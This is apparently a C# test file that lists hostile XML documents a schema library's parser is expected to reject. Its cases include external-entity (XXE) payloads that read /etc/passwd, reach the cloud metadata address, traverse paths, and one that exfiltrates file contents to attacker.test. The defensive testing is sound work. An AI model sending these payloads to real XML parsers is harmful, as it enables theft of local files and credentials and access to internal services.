namespace NetEvolve.Schemas.Xml.Tests.Integration.Hostile;

using NetEvolve.Schemas.Xml.Contracts;

public static partial class HostileCorpus
{
    private static HostileCase Denied(string name, XmlErrorCode expected, string document) =>
        new(name, HostileCategory.ExternalAccess, expected, () => document, HostileAccess.Denied, Resources: Payload());

    // The resolver of a denied file serves a payload for every address it could be asked for, so a request would succeed.
    private static Dictionary<string, Func<string>> Payload() =>
        new(StringComparer.Ordinal)
        {
            ["file:///etc/passwd"] = () => "root:x:0:0",
            ["http://169.254.169.254/latest/meta-data/"] = () => "<!ENTITY secret \"s\">",
            [Origin + "x.dtd"] = () => "<!ENTITY secret \"s\">",
        };

    private static IEnumerable<HostileCase> ExternalSubsets()
    {
        yield return Denied(
            "external-subset-local-file",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"file:///etc/passwd\"><r/>"
        );
        yield return Denied(
            "external-subset-cloud-metadata-address",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"http://169.254.169.254/latest/meta-data/\"><r/>"
        );
        yield return Denied(
            "external-subset-public-identifier",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r PUBLIC \"-//Corpus//DTD Hostile//EN\" \"http://corpus.test/x.dtd\"><r/>"
        );
        yield return Denied(
            "external-subset-network-share",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"file:////attacker.test/share/x.dtd\"><r/>"
        );
        yield return Denied(
            "external-subset-relative-path-traversal",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"../../../../etc/passwd\"><r/>"
        );
        yield return Denied(
            "external-subset-ftp",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"ftp://attacker.test/x.dtd\"><r/>"
        );
        yield return Denied(
            "external-subset-data-uri",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"data:text/plain,%3C!ENTITY%20e%20'x'%3E\"><r/>"
        );
        yield return Denied(
            "external-subset-with-internal-subset",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"http://corpus.test/x.dtd\" [<!ENTITY e \"x\">]><r>&e;</r>"
        );
    }

    private static IEnumerable<HostileCase> ExternalEntities()
    {
        yield return Denied(
            "external-entity-local-file-in-content",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>"
        );
        yield return Denied(
            "external-entity-request-forgery-in-content",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><r>&xxe;</r>"
        );
        yield return Denied(
            "external-entity-public-identifier-in-content",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY xxe PUBLIC \"-//Corpus//EN\" \"http://corpus.test/x.dtd\">]><r>&xxe;</r>"
        );
        yield return Denied(
            "external-entity-in-nested-content",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r><a><b><c>&xxe;</c></b></a></r>"
        );
        yield return Denied(
            "external-entity-in-attribute-value",
            XmlErrorCodes.XML0022,
            "<!DOCTYPE r [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r a=\"&xxe;\"/>"
        );
    }

    private static IEnumerable<HostileCase> ExternalParameterEntities()
    {
        yield return Denied(
            "external-parameter-entity-in-internal-subset",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://corpus.test/x.dtd\"> %p;]><r/>"
        );
        yield return Denied(
            "external-parameter-entity-public-identifier",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r [<!ENTITY % p PUBLIC \"-//Corpus//EN\" \"http://corpus.test/x.dtd\"> %p;]><r/>"
        );
        yield return Denied(
            "external-parameter-entity-reference-in-internal-declaration",
            XmlErrorCodes.XML0019,
            "<!DOCTYPE r [<!ENTITY % file SYSTEM \"file:///etc/passwd\">"
                + "<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.test/?x=%file;'>\">%eval;%exfil;]><r/>"
        );
        yield return Denied(
            "external-entity-and-external-subset",
            XmlErrorCodes.XML2002,
            "<!DOCTYPE r SYSTEM \"http://corpus.test/x.dtd\" [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><r>&xxe;</r>"
        );
        yield return Denied(
            "external-unparsed-entity-reference",
            XmlErrorCodes.XML0021,
            "<!DOCTYPE r [<!NOTATION n SYSTEM \"x\"><!ENTITY u SYSTEM \"file:///etc/passwd\" NDATA n>]><r>&u;</r>"
        );
    }
}
